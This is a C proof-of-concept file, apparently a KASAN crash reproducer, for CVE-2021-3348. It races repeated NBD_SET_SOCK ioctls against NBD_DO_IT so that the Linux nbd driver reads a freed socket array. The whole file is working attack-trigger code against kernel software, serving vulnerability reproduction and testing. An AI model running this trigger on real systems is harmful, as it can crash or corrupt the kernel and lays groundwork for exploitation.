/*
 * CHAINFORGE KASAN crash-trigger for CVE-2021-3348 (CWE-362 race -> CWE-416 use-after-free, nbd).
 * nbd_add_socket() krealloc()s config->socks to add a connection; the I/O path derefs ->socks
 * without locking. Racing repeated NBD_SET_SOCK (realloc) against NBD_DO_IT (starts the device,
 * I/O derefs ->socks) reads the freed array -> UAF. Driven entirely from userspace with a
 * socketpair (nbd just needs a socket fd) — no network, no hardware. NOT an exploit.
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#define NBD_SET_SOCK      _IO(0xab, 0)
#define NBD_SET_BLKSIZE   _IO(0xab, 1)
#define NBD_SET_SIZE      _IO(0xab, 2)
#define NBD_DO_IT         _IO(0xab, 3)
#define NBD_CLEAR_SOCK    _IO(0xab, 4)
#define NBD_DISCONNECT    _IO(0xab, 8)

static int nbd_fd = -1;
static volatile int stop = 0;

/* Spammer: repeatedly add sockets -> nbd_add_socket() krealloc()s config->socks, racing the
 * I/O path in the NBD_DO_IT thread that derefs ->socks. */
static void *adder(void *arg) {
    (void)arg;
    while (!stop) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) continue;
        ioctl(nbd_fd, NBD_SET_SOCK, (unsigned long)sv[0]);  /* realloc ->socks */
        close(sv[0]);
        close(sv[1]);
    }
    return NULL;
}

/* Runner: NBD_DO_IT starts the device and processes requests, dereferencing ->socks. It blocks,
 * so run it in its own thread; a fresh socketpair primes at least one connection. */
static void *runner(void *arg) {
    (void)arg;
    while (!stop) {
        ioctl(nbd_fd, NBD_DO_IT);       /* returns quickly if setup incomplete; loop to re-race */
        usleep(100);
    }
    return NULL;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    nbd_fd = open("/dev/nbd0", O_RDWR);
    if (nbd_fd < 0) { printf("[cf] no /dev/nbd0 (need CONFIG_BLK_DEV_NBD); abort\n"); return 0; }

    /* prime the device: size + one initial socket so NBD_DO_IT reaches the ->socks deref path */
    ioctl(nbd_fd, NBD_SET_BLKSIZE, 512UL);
    ioctl(nbd_fd, NBD_SET_SIZE, 1UL << 20);
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == 0)
        ioctl(nbd_fd, NBD_SET_SOCK, (unsigned long)sv[0]);

    pthread_t r, a1, a2, a3;
    pthread_create(&r, NULL, runner, NULL);
    pthread_create(&a1, NULL, adder, NULL);
    pthread_create(&a2, NULL, adder, NULL);
    pthread_create(&a3, NULL, adder, NULL);

    for (int i = 0; i < 300; i++) {
        usleep(15000);
        if ((i & 63) == 0) printf("[cf] nbd realloc-vs-io racing %d/300\n", i);
    }
    stop = 1;
    ioctl(nbd_fd, NBD_DISCONNECT);
    ioctl(nbd_fd, NBD_CLEAR_SOCK);
    pthread_join(r, NULL);
    pthread_join(a1, NULL);
    pthread_join(a2, NULL);
    pthread_join(a3, NULL);
    printf("[cf] done (no KASAN splat this run)\n");
    return 0;
}
